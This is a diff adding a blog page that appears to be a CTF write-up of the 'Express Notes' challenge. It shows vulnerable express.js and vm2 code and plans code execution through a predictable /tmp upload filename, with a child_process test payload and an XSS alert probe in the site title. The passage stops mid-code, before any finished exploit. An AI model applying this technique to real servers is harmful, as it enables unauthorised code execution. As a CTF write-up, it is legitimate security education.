@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Express notes - &#34;OFFZONE&#34; express file upload challenge - &#34;&gt;&lt;img/src=&#34;/%ff/&#34;/onerror=alert(/blog.xss.am/)&gt;&#34;&lt;</title><meta name="Description" content="Cyber Insecurity blog"><meta property="og:title" content="Express notes - &#34;OFFZONE&#34; express file upload challenge" />
+<meta property="og:description" content="The next challenge we did with Varik Matevosyan on OFFZONE Moscow CTF was an express.js file upload application - Express Notes." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.xss.am/2022/08/offzone-express-notes/" /><meta property="og:image" content="https://blog.xss.am/2022/08/offzone-express-notes/featured-image.jpg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-08-28T00:00:00+04:00" />
+<meta property="article:modified_time" content="2022-08-28T00:00:00+04:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://blog.xss.am/2022/08/offzone-express-notes/featured-image.jpg"/>
+<meta name="twitter:title" content="Express notes - &#34;OFFZONE&#34; express file upload challenge"/>
+<meta name="twitter:description" content="The next challenge we did with Varik Matevosyan on OFFZONE Moscow CTF was an express.js file upload application - Express Notes."/>
+<meta name="application-name" content="/blog.xss.am/">
+<meta name="apple-mobile-web-app-title" content="/blog.xss.am/"><meta name="theme-color" content="#161209"><meta name="msapplication-TileColor" content="#161209"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png"><link rel="apple-touch-icon" sizes="120x120" href="/icons/apple-touch-icon.png"><link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="#161209"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.xss.am/2022/08/offzone-express-notes/" /><link rel="prev" href="https://blog.xss.am/2022/08/offzone-delicious-and-point/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.276e0f03323c1a097f41bcf92a0e23bc16079b9e1aae801b101c8fb90aa496875892c3263fbd90b62de11a4f7df38d3d.css" integrity="sha384-J24PAzI8Ggl/Qbz5Kg4jvBYHm54aroAbEByPuQqklodYksMmP72Qti3hGk998409"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Express notes - \"OFFZONE\" express file upload challenge",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/blog.xss.am\/2022\/08\/offzone-express-notes\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/blog.xss.am\/2022\/08\/offzone-express-notes\/featured-image.jpg",
+                            "width":  1927 ,
+                            "height":  537 
+                        }],"genre": "posts","keywords": "nodejs, express, redis, fileupload","wordcount":  1243 ,
+        "url": "https:\/\/blog.xss.am\/2022\/08\/offzone-express-notes\/","datePublished": "2022-08-28T00:00:00+04:00","dateModified": "2022-08-28T00:00:00+04:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "davwwwx","logo": "https:\/\/blog.xss.am\/images\/Boo.png"},"author": {
+                "@type": "Person",
+                "name": "Davwwwx"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="auto" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="&#34;&gt;&lt;img/src=&#34;/%ff/&#34;/onerror=alert(/blog.xss.am/)&gt;&#34;&lt;"><span class="header-title-pre"><img src=x></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="&#34;&gt;&lt;img/src=&#34;/%ff/&#34;/onerror=alert(/blog.xss.am/)&gt;&#34;&lt;"><span class="header-title-pre"><img src=x></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Express notes - &#34;OFFZONE&#34; express file upload challenge</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/about" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Davwwwx</a></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="28-08-2022">28-08-2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1243 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/2022/08/offzone-express-notes/featured-image.jpg"
+        data-srcset="/2022/08/offzone-express-notes/featured-image.jpg, /2022/08/offzone-express-notes/featured-image.jpg 1.5x, /2022/08/offzone-express-notes/featured-image.jpg 2x"
+        data-sizes="auto"
+        alt="/2022/08/offzone-express-notes/featured-image.jpg"
+        title="/2022/08/offzone-express-notes/featured-image.jpg" /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#the-challenge">The challenge</a></li>
+        <li><a href="#reviewing-the-codebase">Reviewing the codebase</a></li>
+        <li><a href="#exploit">Exploit</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>The next challenge we did with <a href="https://twitter.com/D4RK7ET" target="_blank" rel="noopener noreffer">Varik Matevosyan</a> on <a href="https://offzone.moscow/" target="_blank" rel="noopener noreffer">OFFZONE Moscow</a> CTF was an express.js file upload application - <a href="https://ctf.bi.zone/challenges/28" target="_blank" rel="noopener noreffer">Express Notes</a>.</p>
+<h3 id="the-challenge">The challenge</h3>
+<p>The description of the challenge was:</p>
+<blockquote>
+<p>Hi! Check my simple nodejs express app that allows you to store simple notes and file attachments. <a href="http://express-notes.ctfz.one/" target="_blank" rel="noopener noreffer">get</a>
+Here is <a href="https://ctf.bi.zone/files/sources.zip.5de1984d4ad63ac08b643ad91c0a40fd" target="_blank" rel="noopener noreffer">file</a></p>
+</blockquote>
+<p>As we got the source code, we could see it&rsquo;s an <code>express</code> server with <code>express-fileupload</code> middleware and using <code>redis</code> as the data store. And it does what the challenge description says - you can register a user then create notes and attach files to that notes.</p>
+<h3 id="reviewing-the-codebase">Reviewing the codebase</h3>
+<p>Looking through the <code>server.js</code> we couldn&rsquo;t find anything interesting until <code>/notes</code> <em>POST</em> endpoint that was passing user-supplied body to <code>db.createNote</code> with no sanitization or validation.</p>
+<p><em>server.js line 146-152</em></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/notes&#39;</span><span class="p">,</span> <span class="nx">ensureAuth</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="kr">const</span> <span class="nx">nid</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">createNote</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>
+    <span class="kr">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">addNoteToUser</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span> <span class="nx">nid</span><span class="p">);</span>
+
+    <span class="nx">res</span><span class="p">.</span><span class="nx">flash</span><span class="p">(</span><span class="s1">&#39;success&#39;</span><span class="p">,</span> <span class="sb">`Note </span><span class="si">${</span><span class="nx">nid</span><span class="si">}</span><span class="sb"> was created!`</span><span class="p">);</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="sb">`/notes/</span><span class="si">${</span><span class="nx">nid</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+<span class="p">});</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>And <code>createNote</code> itself was just creating a redis record with that body.</p>
+<p><em>db.js line 92-97</em></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kr">async</span> <span class="nx">createNote</span><span class="p">(</span><span class="nx">content</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kr">const</span> <span class="nx">nid</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">nanoid</span><span class="p">();</span>
+    <span class="kr">const</span> <span class="nx">stamp</span> <span class="o">=</span> <span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
+    <span class="kr">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">hmset</span><span class="p">(</span><span class="sb">`note:</span><span class="si">${</span><span class="nx">nid</span><span class="si">}</span><span class="sb">`</span><span class="p">,</span> <span class="p">{...</span><span class="nx">content</span><span class="p">,</span> <span class="s1">&#39;hashcash&#39;</span><span class="o">:</span> <span class="nx">stamp</span><span class="p">});</span>
+    <span class="k">return</span> <span class="nx">nid</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Then looking through <code>/notes/:nid</code> <em>GET</em> endpoint we saw that it executed a javascript code with <a href="https://github.com/patriksimek/vm2" target="_blank" rel="noopener noreffer">vm2 sandbox</a> and set with <code>require: { external: true }</code> option, which, as the name suggests, enables it to require external files. Also on line 15 (below), we can see that the &ldquo;sandboxed&rdquo; code executed <code>note.file</code> which we most probably could supply, because, as said above in <code>/notes</code> <em>POST</em> endpoint, we can store a note object with arbitrary properties.</p>
+<p><em>server.js line 154-183</em></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/notes/:nid&#39;</span><span class="p">,</span> <span class="nx">ensureAuth</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="kr">const</span> <span class="p">{</span> <span class="nx">nid</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="kr">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">hasUserNoteAcess</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span> <span class="nx">nid</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;/notes&#39;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nx">db</span><span class="p">.</span><span class="nx">getNote</span><span class="p">(</span><span class="nx">nid</span><span class="p">).</span><span class="nx">then</span><span class="p">((</span><span class="nx">note</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nx">note</span><span class="p">.</span><span class="nx">fileLoaded</span><span class="p">){</span>
+        <span class="nx">out</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">NodeVM</span><span class="p">(</span> <span class="p">{</span>
+          <span class="nx">console</span><span class="o">:</span> <span class="s1">&#39;inherit&#39;</span><span class="p">,</span>
+          <span class="nx">sandbox</span><span class="o">:</span> <span class="p">{</span> <span class="nx">note</span><span class="p">,</span> <span class="nx">out</span> <span class="p">},</span>
+          <span class="nx">require</span><span class="o">:</span> <span class="p">{</span> <span class="nx">external</span><span class="o">:</span> <span class="kc">true</span> <span class="p">}</span>
+        <span class="p">}</span> <span class="p">);</span>
+        <span class="nx">c</span> <span class="o">=</span> <span class="sb">` try{
+</span><span class="sb">                text = require(note.file)[&#34;userdata&#34;];
+</span><span class="sb">                delete require.cache[require.resolve(note.file)];
+</span><span class="sb">                out.text = text;
+</span><span class="sb">              } catch (error) {
+</span><span class="sb">                out.text = &#34;Can&#39;t load file ;(&#34;;
+</span><span class="sb">              }`</span>
+        <span class="nx">vm</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="nx">c</span><span class="p">);</span>
+        <span class="nx">text</span> <span class="o">=</span> <span class="nx">out</span><span class="p">.</span><span class="nx">text</span><span class="p">;</span>
+      <span class="p">}</span> <span class="k">else</span><span class="p">{</span>
+        <span class="nx">text</span> <span class="o">=</span> <span class="s2">&#34;Thank you for using our service. File now is processing on the server. You can reload page to check if file loaded.&#34;</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;note&#39;</span><span class="p">,</span> <span class="p">{</span>  <span class="nx">nid</span><span class="p">,</span>
+                            <span class="nx">note</span><span class="p">,</span>
+                            <span class="nx">text</span> <span class="p">});</span>
+    <span class="p">});</span>
+<span class="p">});</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>So we could control <code>note.file</code> parameter and execute any javascript file. But we needed to upload a file to a known location to pass it to the sink. And <code>/notes/:nid/upload</code> was the file upload endpoint we needed as it uploads the user-supplied file to <code>/app/uploads</code>.</p>
+<p><em>server.js line 185-209</em></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/notes/:nid/upload&#39;</span><span class="p">,</span> <span class="nx">ensureAuth</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="kr">const</span> <span class="nx">timeUploaded</span> <span class="o">=</span> <span class="p">(</span><span class="k">new</span> <span class="nb">Date</span><span class="p">()).</span><span class="nx">toISOString</span><span class="p">();</span>
+    <span class="kr">const</span> <span class="p">{</span> <span class="nx">nid</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">;</span>
+    <span class="kr">const</span> <span class="nx">textFile</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">.</span><span class="nx">isArray</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">files</span><span class="o">?</span><span class="p">.</span><span class="nx">textFile</span><span class="p">)</span> <span class="o">?</span> <span class="nx">req</span><span class="p">.</span><span class="nx">files</span><span class="o">?</span><span class="p">.</span><span class="nx">textFile</span><span class="o">?</span><span class="p">.</span><span class="nx">shift</span><span class="p">()</span> <span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">files</span><span class="o">?</span><span class="p">.</span><span class="nx">textFile</span><span class="p">;</span>
+    <span class="kr">const</span> <span class="nx">uploadPath</span> <span class="o">=</span> <span class="nx">__dirname</span> <span class="o">+</span> <span class="s1">&#39;/uploads/&#39;</span> <span class="o">+</span> <span class="nx">uuidv4</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;_&#39;</span> <span class="o">+</span> <span class="nx">textFile</span><span class="o">?</span><span class="p">.</span><span class="nx">name</span><span class="p">;</span>
+    <span class="kr">const</span> <span class="nx">hashcash</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">checkHashcash</span><span class="p">(</span><span class="nx">nid</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">hashcash</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">textFile</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;No files were uploaded.&#39;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">hashcash</span><span class="p">){</span>
+      <span class="nx">textFile</span><span class="p">.</span><span class="nx">mv</span><span class="p">(</span><span class="s2">&#34;/dev/null&#34;</span><span class="p">)</span>
+      <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;Wrong hashcash.&#39;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nx">FILE_ID</span> <span class="o">=</span> <span class="nx">FILE_ID</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
+    <span class="nx">db</span><span class="p">.</span><span class="nx">addFile</span><span class="p">(</span><span class="nx">nid</span><span class="p">,</span> <span class="nx">uploadPath</span><span class="p">,</span> <span class="nx">timeUploaded</span><span class="p">,</span> <span class="nx">FILE_ID</span><span class="p">);</span>
+    <span class="nx">db</span><span class="p">.</span><span class="nx">genHashcash</span><span class="p">(</span><span class="nx">nid</span><span class="p">);</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="sb">`/notes/</span><span class="si">${</span><span class="nx">nid</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+    <span class="c1">// since node work in 1 thread, data parsing hangs all event loop. Spawning in new process
+</span><span class="c1"></span>    <span class="nx">setTimeout</span><span class="p">(()=&gt;{</span>
+      <span class="nx">execFile</span><span class="p">(</span><span class="sb">`./dataParser`</span><span class="p">,</span> <span class="p">[</span><span class="nx">textFile</span><span class="p">[</span><span class="s2">&#34;tempFilePath&#34;</span><span class="p">],</span> <span class="nx">uploadPath</span><span class="p">],</span> <span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">stdout</span><span class="p">,</span> <span class="nx">stderr</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+        <span class="nx">textFile</span><span class="p">.</span><span class="nx">mv</span><span class="p">(</span><span class="s2">&#34;/dev/null&#34;</span><span class="p">);</span>
+        <span class="nx">db</span><span class="p">.</span><span class="nx">updateFileStatus</span><span class="p">(</span><span class="nx">nid</span><span class="p">);</span>
+      <span class="p">});</span>
+    <span class="p">},</span> <span class="mi">0</span><span class="p">);</span>
+<span class="p">});</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>But on line 20 (above), it also passes our file through <code>./dataParser</code> program before moving to the <code>uploads</code> directory, which makes achieving code execution hard, escaping potentially dangerous characters and setting the payload as a string.</p>
+<p><em>before</em></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">$</span><span class="p">{</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">)}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><em>after ./dataParser</em></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="kd">var</span> <span class="nx">user_data</span> <span class="o">=</span> <span class="sb">`\$\{require(&#39;child_process&#39;)\}`</span>
+<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">user_data</span> <span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>After playing a bit with the data processor we realized that we could not bypass the filtering, and we moved forward to finding other ways to supply our uploaded file. So we went through <code>/notes/:nid/upload</code> once more and saw that if we provided other form parameter name than <code>textFile</code> for the file, it would be uploaded to <code>/tmp</code> and not be removed, because the check on line 7 (see above in <em>server.js line 185-209</em>) would fail and there would be no further processing of the file.</p>
+<p><figure><a class="lightgallery" href="/2022/08/offzone-express-notes/file-upload-error.png" title="file-upload-error" data-thumbnail="/2022/08/offzone-express-notes/file-upload-error.png" data-sub-html="<h2>400 response on file upload</h2><p>file-upload-error</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="file-upload-error.png"
+            data-srcset="/2022/08/offzone-express-notes/file-upload-error.png, file-upload-error.png 1.5x, /2022/08/offzone-express-notes/file-upload-error.png 2x"
+            data-sizes="auto"
+            alt="/2022/08/offzone-express-notes/file-upload-error.png" />
+    </a><figcaption class="image-caption">400 response on file upload</figcaption>
+    </figure></p>
+<p>Let&rsquo;s see what we wanted to do at this point.</p>
+<ul>
+<li>Upload a javascript file that would be kept in <code>/tmp</code> directory.</li>
+<li>Create a note with an attachment of our uploaded file with the following body <code>{ &quot;fileLoaded&quot;: true, &quot;file&quot;: &quot;/tmp/some_path&quot; }</code></li>
+<li>Request <code>/note/:nid</code> <em>GET</em> endpoint and get our code executed from <code>/tmp/some_path</code></li>
+</ul>
+<p>To understand what name our uploaded file would have, we checked out <a href="https://github.com/richardgirges/express-fileupload" target="_blank" rel="noopener noreffer">express-fileupload</a>. <a href="https://github.com/richardgirges/express-fileupload/blob/26f4a9235cd2434fdb0debd7934ae8a7190bbb82/lib/utilities.js#L34" target="_blank" rel="noopener noreffer">lib/utilites.js</a> on line 34 sets the uploaded file name as <code>${prefix}-${tempCounter}-${Date.now()}</code>, where the <code>prefix</code> is the temporary directory, e.g. <code>/tmp</code>, <code>tempCounter</code> is a simple counter starting from 1, and <code>Date.now</code> is the current timestamp which we could get partially without milliseconds from <code>Date</code> header on the upload request&rsquo;s response.</p>
+<p>So we knew the <code>prefix</code>, we could bruteforce 1000 possible milliseconds for <code>Date.now</code>, but we also needed the <code>tempCounter</code>. <code>/note/:nid</code> page responds with the file ID when the upload was successful.</p>
+<p><figure><a class="lightgallery" href="/2022/08/offzone-express-notes/file-id.png" title="file-id" data-thumbnail="/2022/08/offzone-express-notes/file-id.png" data-sub-html="<h2>File ID on notes/:nid page</h2><p>file-id</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="file-id.png"
+            data-srcset="/2022/08/offzone-express-notes/file-id.png, file-id.png 1.5x, /2022/08/offzone-express-notes/file-id.png 2x"
+            data-sizes="auto"
+            alt="/2022/08/offzone-express-notes/file-id.png" />
+    </a><figcaption class="image-caption">File ID on notes/:nid page</figcaption>
+    </figure></p>
+<p>As it was a CTF challenge and lots of players were uploading files, we could not precisely tell what file ID would <code>/notes/:nid/upload</code> file have and the bruteforce range would get bigger. But reviewing the upload endpoint one more time and thus looking deeper into <code>checkHashcash</code> function we found a possible unhandled error (line 3 below).</p>
+<p><em>db.js line 108-117</em></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kr">async</span> <span class="nx">checkHashcash</span><span class="p">(</span><span class="nx">nid</span><span class="p">,</span> <span class="nx">hashcash</span><span class="p">){</span>
